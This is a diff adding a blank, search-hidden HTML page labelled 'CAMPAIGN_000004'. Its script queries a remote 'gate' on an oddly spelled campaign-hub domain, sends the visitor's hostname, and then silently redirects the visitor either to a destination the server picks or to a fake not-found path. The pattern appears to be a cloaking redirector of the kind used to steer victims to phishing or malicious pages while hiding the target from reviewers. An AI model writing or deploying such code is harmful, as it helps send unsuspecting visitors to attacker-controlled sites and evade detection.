@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="robots" content="noindex,nofollow">
+  <title>CAMPAIGN_000004</title>
+  <style>
+    html,body{margin:0;min-height:100%;background:#fff}
+  </style>
+</head>
+<body>
+  <!-- CAMPAIGN_000004 | gru1::9fde5-he8jy2 | color:74 -->
+  <script>
+    var requestId = self.crypto && crypto.randomUUID
+      ? crypto.randomUUID()
+      : Date.now().toString(36) + Math.random().toString(36).slice(2);
+    var notFoundPath = "/.cmp-off-4-" + requestId;
+    var gateUrl = "https://click-campaing-hub.guimaraesestevo5.chatgpt.site/api/gate/9fde52a0-9cc0-4916-864a-6cab9550c5cd" + "?host=" + encodeURIComponent(location.hostname);
+    fetch(gateUrl, {cache:"no-store"})
+      .then(function(response){return response.json()})
+      .then(function(data){
+        if(data.active && data.destination){location.replace(data.destination);return}
+        location.replace(notFoundPath);
+      })
+      .catch(function(){
+        location.replace(notFoundPath);
+      });
+  </script>
+</body>
+</html>
